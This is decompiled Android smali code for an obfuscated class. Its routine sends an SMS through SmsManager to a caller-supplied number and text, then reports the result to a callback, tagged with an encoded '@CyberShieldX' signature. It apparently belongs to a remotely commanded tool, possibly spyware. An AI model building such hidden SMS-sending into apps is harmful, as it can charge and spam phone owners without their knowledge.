.class public final Lb/g;
.super Ljava/lang/Object;
.source "SourceFile"


# instance fields
.field public final a:Landroid/content/Context;

.field public final b:Lc/b;

.field public final c:Lc/e;

.field public final d:Le/c;

.field public e:Ls4/c;

.field public final f:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;Lc/b;)V
    .locals 1

    .line 1
    const-string v0, "context"

    invoke-static {p1, v0}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lb/g;->a:Landroid/content/Context;

    iput-object p2, p0, Lb/g;->b:Lc/b;

    new-instance p2, Lc/e;

    invoke-direct {p2, p1}, Lc/e;-><init>(Landroid/content/Context;)V

    iput-object p2, p0, Lb/g;->c:Lc/e;

    new-instance p2, Le/c;

    invoke-direct {p2, p1}, Le/c;-><init>(Landroid/content/Context;)V

    iput-object p2, p0, Lb/g;->d:Le/c;

    const-string p1, "QEN5YmVyU2hpZWxkWA==|WxBcm15AknsdklASkDS2139jScno3FNd39nvo9wasdasd33ssKDnF9efnDFNOFDj"

    iput-object p1, p0, Lb/g;->f:Ljava/lang/String;

    return-void
.end method

.method public static final a(Lb/g;Ljava/lang/String;Ljava/lang/String;)V
    .locals 11

    .line 1
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 2
    .line 3
    .line 4
    const-string v0, "android.permission.SEND_SMS"

    .line 5
    .line 6
    iget-object v1, p0, Lb/g;->a:Landroid/content/Context;

    .line 7
    .line 8
    invoke-static {v1, v0}, Lb/b;->f(Landroid/content/Context;Ljava/lang/String;)Z

    .line 9
    .line 10
    .line 11
    move-result v0

    .line 12
    iget-object v2, p0, Lb/g;->f:Ljava/lang/String;

    .line 13
    .line 14
    iget-object p0, p0, Lb/g;->b:Lc/b;

    .line 15
    .line 16
    if-eqz v0, :cond_0

    .line 17
    .line 18
    new-instance v0, Landroid/content/Intent;

    .line 19
    .line 20
    const-string v3, "SMS_SENT"

    .line 21
    .line 22
    invoke-direct {v0, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 23
    .line 24
    .line 25
    const/high16 v3, 0x2000000

    .line 26
    .line 27
    const/4 v4, 0x0

    .line 28
    invoke-static {v1, v4, v0, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    .line 29
    .line 30
    .line 31
    move-result-object v9

    .line 32
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    .line 33
    .line 34
    .line 35
    move-result-object v5

    .line 36
    const/4 v7, 0x0

    .line 37
    const/4 v10, 0x0

    .line 38
    move-object v6, p1

    .line 39
    move-object v8, p2

    .line 40
    invoke-virtual/range {v5 .. v10}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 41
    .line 42
    .line 43
    new-instance p2, Ljava/lang/StringBuilder;

    .line 44
    .line 45
    const-string v0, "Your SMS has been sent to "

    .line 46
    .line 47
    invoke-direct {p2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 48
    .line 49
    .line 50
    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 51
    .line 52
    .line 53
    const/16 p1, 0xa

    .line 54
    .line 55
    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 56
    .line 57
    .line 58
    invoke-static {v2}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 59
    .line 60
    .line 61
    move-result-object p1

    .line 62
    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 63
    .line 64
    .line 65
    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object p1

    .line 69
    :goto_0
    invoke-virtual {p0, p1}, Lc/b;->a(Ljava/lang/String;)V

    .line 70
    .line 71
    .line 72
    goto :goto_1

    .line 73
    :cond_0
    invoke-static {v2}, Lb/b;->h(Ljava/lang/String;)Ljava/lang/String;

    .line 74
    .line 75
    .line 76
    move-result-object p1

    .line 77
    const-string p2, "Send sms permission denied\n"

    .line 78
    .line 79
    invoke-virtual {p2, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    .line 80
    .line 81
    .line 82
    move-result-object p1

    .line 83
    goto :goto_0

    .line 84
    :goto_1
    return-void
.end method
